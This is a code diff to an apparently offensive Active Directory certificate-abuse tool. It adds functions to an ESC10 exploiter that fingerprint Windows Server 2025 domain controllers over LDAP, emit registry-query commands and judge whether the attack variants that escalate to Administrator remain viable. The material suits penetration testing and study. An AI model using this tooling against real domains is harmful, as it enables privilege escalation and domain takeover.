@@ -32,7 +32,14 @@
 //! 4. Authenticate with the certificate — DC resolves the cert to Administrator via UPN.
 //!
 //! Reference: Oliver Lyak, "Certificates and Pwnage and Patches" (2022)
+//!
+//! # WS2025 Considerations
+//! - **Variant A** (`StrongCertificateBindingEnforcement`): WS2025 fresh installs
+//!   default to `2` (Enforced), which **blocks** this variant. Upgrades preserve `1`.
+//! - **Variant B** (`CertificateMappingMethods & 0x4`): WS2025 does NOT change this
+//!   default, so Variant B remains viable.
 
+use crate::adcs::esc_strong_mapping::{cert_mapping_methods_command, collect_dc_builds, is_ws2025_build, reg_query_command, StrongBindingState};
 use crate::adcs::pfx::create_pfx;
 use crate::adcs::web_enrollment::WebEnrollmentClient;
 use crate::adcs::{IssuedCertificate, create_esc1_csr};
@@ -273,6 +280,51 @@ impl Esc10Exploiter {
         }
 
         cert_result
+    }
+
+    /// Detect the `StrongCertificateBindingEnforcement` state across all DCs
+    /// using LDAP attribute enumeration (build version inference) plus operator
+    /// hints for registry verification.
+    ///
+    /// Returns a summary including the inferred state from build versions,
+    /// whether WS2025 DCs are present, and registry commands for confirmation.
+    pub async fn detect_enforcement_state(ldap: &mut LdapSession) -> crate::adcs::esc_strong_mapping::StrongMappingAssessment {
+        let dc_builds = collect_dc_builds(ldap).await;
+        let ws2025_dc_present = dc_builds.iter().any(|os| is_ws2025_build(Some(os), None));
+
+        // Without registry access we can't determine actual enforcement on WS2025.
+        // Emit commands for manual verification.
+        if ws2025_dc_present {
+            info!(
+                "ESC10: WS2025 DC detected — StrongCertificateBindingEnforcement check required.\n\
+                 Run on any domain-joined machine:\n  {}",
+                dc_builds.first().map(|d| reg_query_command(d)).unwrap_or_default()
+            );
+            info!(
+                "ESC10B: CertificateMappingMethods check:\n  {}",
+                dc_builds.first().map(|d| cert_mapping_methods_command(d)).unwrap_or_default()
+            );
+        }
+
+        crate::adcs::esc_strong_mapping::assess_strong_mapping(
+            dc_builds,
+            ws2025_dc_present,
+            StrongBindingState::Unknown, // needs registry confirmation
+        )
+    }
+
+    /// Convenience variant that returns just whether ESC10 is likely blocked
+    /// on the environment's DCs, based on build info alone.
+    /// Returns `Some(true)` if ESC10A is likely blocked (WS2025 fresh install),
+    /// `Some(false)` if likely viable, `None` if indeterminate.
+    pub async fn is_esc10a_blocked(ldap: &mut LdapSession) -> Option<bool> {
+        let dc_builds = collect_dc_builds(ldap).await;
+        let ws2025_dc_present = dc_builds.iter().any(|os| is_ws2025_build(Some(os), None));
+        if ws2025_dc_present {
+            Some(true) // WS2025 defaults to Enforced; upgrade may preserve old
+        } else {
+            Some(false) // Pre-WS2025 defaults don't enforce
+        }
     }
 
     /// Check whether the DC registry indicates ESC10 Variant A
